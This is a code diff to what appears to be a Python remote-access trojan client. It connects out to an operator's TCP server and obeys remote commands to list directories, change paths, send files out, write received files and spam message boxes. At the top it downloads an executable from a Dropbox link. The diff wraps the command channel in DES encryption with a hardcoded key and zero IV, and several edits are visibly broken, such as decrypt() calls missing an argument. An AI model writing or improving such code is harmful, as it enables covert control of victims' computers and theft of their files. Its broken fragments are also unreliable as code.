@@ -9,6 +9,34 @@ from subprocess import call
 from subprocess import Popen, PIPE
 import cython
 import urllib.request
+import pycrypt
+import base64
+import Crypto
+from cryptography.fernet import Fernet
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from pyDes import *
+import base64
+
+# things you need to fill in
+TCP_IP = '127.0.0.1'
+TCP_PORT = 80
+BUFFER_SIZE = 1024  # Normally 1024, but we want fast response
+# PASSKEY MUST BE EXACTLY 8 BYTES LONG
+PASSKEY = "aaaaaaaa"
+
+
+def encrypt(password, data):
+    k = des(password, CBC, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
+    d = k.encrypt(data)
+    return d
+
+def decrypt(password, data):
+    k = des(password, CBC, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
+    d = k.decrypt(data)
+    return d
+
 if os.name == "nt":
     import ctypes
     import win32com.client
@@ -16,12 +44,8 @@ if os.name == "nt":
     MessageBox = ctypes.windll.user32.MessageBoxW
 
 urllib.request.urlretrieve("https://www.dropbox.com/s/m6sqwjz63sr38ci/SetVol.exe?dl=1", "/temp/SetVol.exe")
-os.system("/temp/SetVol.exe 100")
 
-BitBlt()
-TCP_IP = '127.0.0.1'
-TCP_PORT = 80
-BUFFER_SIZE = 1024  # Normally 1024, but we want fast response
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.connect((TCP_IP, TCP_PORT))
@@ -34,9 +58,10 @@ while 1:
     data.insert(0, "")
     try:
         conn.settimeout(60)
-        dataraw = conn.recv(BUFFER_SIZE).decode()
+        dataraw = decrypt(PASSKEY, conn.recv(BUFFER_SIZE)).decode()
         data = dataraw.split()
-    except:
+    except Exception as e:
+        print(e)
         s.close()
         connected = False
         while connected == False:
@@ -49,24 +74,25 @@ while 1:
                 connected = True
                 print("Woohoo Connection has been restored!")
                 conn.settimeout(60)
-                dataraw = conn.recv(BUFFER_SIZE).decode()
+                dataraw = conn.recv(BUFFER_SIZE)
                 data = dataraw.split()
             except:
                 s.close()
                 print("Retrying connection..")
     try:
         print(data)
-    except:
-        print("")
+    except Exception as e:
+        print("nope " + str(e))                                                     
     if data[0] == "ls":
         try:
             if len(data) == 2:
                 thlst = os.listdir(data[1])
-                conn.send(' '.join(thlst).encode())
+                conn.send(encrypt(PASSKEY, ' '.join(thlst)))
             else:
                 thlst = os.listdir(os.getcwd())
-                conn.send(" ".join(thlst).encode())
+                conn.send(encrypt(PASSKEY, " ".join(thlst)))
         except:
+            print('nope')
             connected == False
             while connected == False:
                 time.sleep(1)
@@ -88,9 +114,9 @@ while 1:
         if len(data) == 2:
             try:
                 os.chdir(data[1])
-                conn.send(("Successful! Path is now" + os.getcwd()).encode())
+                conn.send(encrypt(PASSKEY, ("Successful! Path is now" + os.getcwd())))
             except:
-                conn.send("Unsuccessful! Path doesnt exist or something".encode())
+                conn.send(encrypt(PASSKEY, "Unsuccessful! Path doesnt exist or something"))
     elif data[0] == "download":
         if len(data) == 3:
             try:
@@ -99,7 +125,7 @@ while 1:
                 l = f.read(1024)
                 while (l):
                         print('Sending...')
-                        s.send(l)
+                        s.send(encrypt(PASSKEY, l))
                         l = f.read(1024)
                 print("sent")
             except Exception as e:
@@ -107,14 +133,15 @@ while 1:
     elif data[0] == "":
         print("thats nothing")
     elif data[0] == "keepalive":
-        s.send("still alive".encode())
+        s.send(encrypt(PASSKEY, "still alive"))
     elif data[0] == "spammessage":
-        a = (int(data[3]) / 100)
-        a2 = 0
-        while a2 < a:
-            time.sleep(0.01)
-            MessageBox(None, data[1], data[2], 0)
-            a2 = a2 + 0.01
+        if len(data) == 3:
+            a = (int(data[3]) / 100)
+            a2 = 0
+            while a2 < a:
+                time.sleep(0.01)
+                MessageBox(None, data[1], data[2], 0)
+                a2 = a2 + 0.01
     elif data[0] == "spamwebsite":
         a = (int(data[2]) / 100)
         a2 = 0
@@ -128,13 +155,13 @@ while 1:
                 f = open(data[1], "wb")
             elif len(data) == 3:
                 f = open(data[2], "wb")
-            l = s.recv(1024)
+            l = decrypt(s.recv(1024))
             f.write(l)
             conn.settimeout(3)
             while (l):
                 print("receiving...")
                 try:
-                    l = conn.recv(1024)
+                    l = decrypt(conn.recv(1024))
                     f.write(l)
                 except:
                     print("Something went wrong during the download. Or the download successfuly finished!! fuuck you anyywwaaay")
